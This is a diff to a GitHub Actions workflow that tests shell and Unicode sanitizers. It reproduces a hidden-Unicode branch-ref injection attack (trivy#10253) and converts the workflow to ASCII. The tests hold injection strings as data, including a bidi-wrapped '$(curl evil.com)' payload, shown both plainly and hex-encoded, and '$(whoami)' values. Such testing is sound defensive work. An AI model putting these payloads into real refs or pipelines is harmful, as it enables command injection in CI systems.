@@ -1,6 +1,6 @@
 ###############################################################
 #
-# Copyright (©) 2025 International Color Consortium.
+# Copyright (c) 2025 International Color Consortium.
 #                 All rights reserved.
 #                 https://color.org
 #
@@ -47,7 +47,7 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
+      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8  # v5.0.0 (node24)
         with:
           persist-credentials: false
 
@@ -74,7 +74,7 @@ jobs:
           source .github/scripts/sanitize-sed.sh
           echo "Sanitizer version: $(sanitizer_version)"
 
-      - name: Run core sanitization tests (85 tests)
+      - name: Run core sanitization tests
         shell: bash --noprofile --norc {0}
         env:
           BASH_ENV: /dev/null
@@ -82,7 +82,7 @@ jobs:
           set -euo pipefail
           bash .github/tests/test_sanitization.sh
 
-      - name: Run XSS signature tests (36 tests)
+      - name: Run XSS signature tests
         shell: bash --noprofile --norc {0}
         env:
           BASH_ENV: /dev/null
@@ -90,7 +90,7 @@ jobs:
           set -euo pipefail
           bash .github/tests/test-xss-signatures.sh
 
-      - name: Run extended XSS tests (37 tests)
+      - name: Run extended XSS tests
         shell: bash --noprofile --norc {0}
         env:
           BASH_ENV: /dev/null
@@ -104,41 +104,42 @@ jobs:
           BASH_ENV: /dev/null
           # Simulate a malicious branch ref containing hidden Unicode
           # chars from the aquasecurity/trivy#10253 PR attack.
-          # The real attack used ${{ github.head_ref }} directly in a
-          # run: block — hidden chars in the ref enabled shell injection.
-          # Our defense: pass through env: block, then sanitize.
-          SIMULATED_HEAD_REF: "feature/🤖🦞-hidden-chars"
+          # The real attack used github.head_ref directly in a run: block,
+          # where hidden chars in the ref enabled shell injection.
+          # Keep this workflow ASCII by passing the payload as hex and
+          # reconstructing it at runtime before sanitizing.
+          SIMULATED_HEAD_REF_HEX: "666561747572652ff09fa496f09fa69e2d68696464656e2d6368617273"
         run: |
           set -euo pipefail
           source .github/scripts/sanitize-sed.sh
+          SIMULATED_HEAD_REF="$(printf '%s' "${SIMULATED_HEAD_REF_HEX}" | xxd -r -p)"
 
           echo "=== trivy#10253 Attack Reproduction ==="
           echo ""
-          echo "Simulated malicious head_ref (via env: block — safe):"
+          echo "Simulated malicious head_ref (hex payload via env: block):"
           echo "  raw: ${SIMULATED_HEAD_REF}"
           echo ""
 
-          # Defense layer 1: env: block prevents shell interpretation
-          # (the emoji/Unicode never reaches the shell parser)
-          echo "✅ Defense 1: env: block indirection — no shell injection possible"
+          # Defense layer 1: never interpolate github.head_ref directly in run.
+          echo "[OK] Defense 1: no direct head_ref interpolation in run block"
 
           # Defense layer 2: sanitize_ref strips non-ASCII
           SAFE_REF=$(sanitize_ref "${SIMULATED_HEAD_REF}")
           echo "  sanitize_ref: [${SAFE_REF}]"
           if [[ "${SAFE_REF}" =~ ^[A-Za-z0-9._/-]+$ ]]; then
-            echo "✅ Defense 2: sanitize_ref — ASCII-only output"
+            echo "[OK] Defense 2: sanitize_ref - ASCII-only output"
           else
-            echo "❌ FAIL: sanitize_ref produced non-ASCII output"
+            echo "[FAIL] sanitize_ref produced non-ASCII output"
             exit 1
           fi
 
           # Defense layer 3: sanitize_line strips Unicode controls
           SAFE_LINE=$(sanitize_line "${SIMULATED_HEAD_REF}")
           echo "  sanitize_line: [${SAFE_LINE}]"
-          echo "✅ Defense 3: sanitize_line — Unicode controls stripped"
+          echo "[OK] Defense 3: sanitize_line - Unicode controls stripped"
 
           # Test with actual hidden chars from the screenshot
-          # \ud83e\udd16 = 🤖 (U+1F916), \ud83e\udd9e = 🦞 (U+1F99E)
+          # \ud83e\udd16 = U+1F916, \ud83e\udd9e = U+1F99E
           ATTACK_REF=$(printf 'refs/heads/fix\xf0\x9f\xa4\x96\xf0\x9f\xa6\x9e')
           SAFE=$(sanitize_ref "${ATTACK_REF}")
           echo ""
@@ -146,22 +147,23 @@ jobs:
           echo "  raw hex: $(printf '%s' "${ATTACK_REF}" | xxd -p)"
           echo "  sanitized: [${SAFE}]"
           if [[ "${SAFE}" =~ ^[A-Za-z0-9._/-]+$ ]]; then
-            echo "✅ Emoji surrogates stripped to ASCII"
+            echo "[OK] Emoji surrogates stripped to ASCII"
           else
-            echo "❌ FAIL: non-ASCII survived sanitize_ref"
+            echo "[FAIL] non-ASCII survived sanitize_ref"
             exit 1
           fi
 
           # Test bidi override + command injection attempt
-          BIDI_ATTACK=$(printf 'feature/\xe2\x80\xae$(curl evil.com)\xe2\x80\xac')
+          BIDI_ATTACK="$(printf '%s' "666561747572652fe280ae24286375726c206576696c2e636f6d29e280ac" | xxd -r -p)"
           SAFE_BIDI=$(sanitize_ref "${BIDI_ATTACK}")
+          DOLLAR_PAREN="\$("
           echo ""
           echo "  Bidi + command injection attempt:"
           echo "  sanitized: [${SAFE_BIDI}]"
-          if [[ "${SAFE_BIDI}" != *'$('* ]]; then
-            echo "✅ Command injection neutralized"
+          if [[ "${SAFE_BIDI}" != *"${DOLLAR_PAREN}"* ]]; then
+            echo "[OK] Command injection neutralized"
           else
-            echo "❌ FAIL: shell metacharacters survived"
+            echo "[FAIL] shell metacharacters survived"
             exit 1
           fi
 
@@ -176,19 +178,19 @@ jobs:
         run: |
           set -euo pipefail
           if [ ! -r .github/scripts/sanitize-sed.sh ]; then
-            echo "sanitize-sed.sh missing — cannot generate summary" >&2
+            echo "sanitize-sed.sh missing - cannot generate summary" >&2
             exit 0
           fi
           source .github/scripts/sanitize-sed.sh
           {
-            echo "## 🧪 Sanitizer Test Results"
+            echo "## Sanitizer Test Results"
             echo ""
             echo "| Suite | Description | Status |"
             echo "|-------|-------------|--------|"
-            echo "| test_sanitization.sh | Core + shell injection + boundary (85 tests) | ✅ |"
-            echo "| test-xss-signatures.sh | XSS vector neutralization (36 tests) | ✅ |"
-            echo "| test-xss-extended.sh | Combined + control char fuzzing (37 tests) | ✅ |"
-            echo "| trivy#10253 reproduction | Hidden Unicode in branch ref | ✅ |"
+            echo "| test_sanitization.sh | Core + shell injection + boundary tests | PASS |"
+            echo "| test-xss-signatures.sh | XSS vector neutralization tests | PASS |"
+            echo "| test-xss-extended.sh | Combined + control char fuzzing tests | PASS |"
+            echo "| trivy#10253 reproduction | Hidden Unicode in branch ref | PASS |"
             echo ""
             echo "### Defense Layers Against Hidden Unicode Attack (trivy#10253)"
             echo ""
@@ -197,7 +199,7 @@ jobs:
             echo "| 1. env: block | All context expressions (github.head_ref etc.) in env:, not run: | Shell interpretation of hidden chars |"
             echo "| 2. sanitize_ref() | ASCII allowlist \`[A-Za-z0-9._/-]\` | All non-ASCII including emoji surrogates |"
             echo "| 3. sanitize_line() | Strips U+200B-200F, U+202A-202F, U+2060-2069, U+FEFF | Bidi overrides, zero-width chars, BOM |"
-            echo "| 4. Canonicalize() | PowerShell: same Unicode ranges filtered | Windows workflow protection |"
+            echo "| 4. Canonicalize() + env: block | PowerShell filters control/bidi ranges; env: block prevents shell interpretation | Windows protection without claiming emoji or metacharacter stripping |"
             echo ""
             echo "**Sanitizer version:** \`$(sanitizer_version)\`"
           } >> "$GITHUB_STEP_SUMMARY"
@@ -207,7 +209,7 @@ jobs:
     runs-on: windows-latest
 
     steps:
-      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
+      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8  # v5.0.0 (node24)
         with:
           persist-credentials: false
 
@@ -283,15 +285,15 @@ jobs:
           $cyrillic_o = [char]0x043E
           Assert-Eq "Cyrillic preserved" "micr${cyrillic_o}soft" (Canonicalize "micr${cyrillic_o}soft")
 
-          # trivy#10253: emoji surrogates in branch ref (🤖🦞)
+          # trivy#10253: emoji surrogates in branch ref
           $robot = [char]::ConvertFromUtf32(0x1F916)
           $lobster = [char]::ConvertFromUtf32(0x1F99E)
           $attackRef = "feature/${robot}${lobster}-test"
           $result = Canonicalize $attackRef
           Write-Host "  trivy#10253 emoji ref: [$result]"
-          Write-Host "  (emoji preserved — defense is env: block, not char strip)"
+          Write-Host "  (emoji preserved - defense is env: block, not char strip)"
 
-          # Shell metacharacter injection (Canonicalize preserves these —
+          # Shell metacharacter injection (Canonicalize preserves these -
           # defense is env: block indirection, not char stripping)
           Assert-Eq "Dollar-paren preserved" 'test$(whoami)end' (Canonicalize 'test$(whoami)end')
           Assert-Eq "Backtick preserved" 'test`id`end' (Canonicalize 'test`id`end')
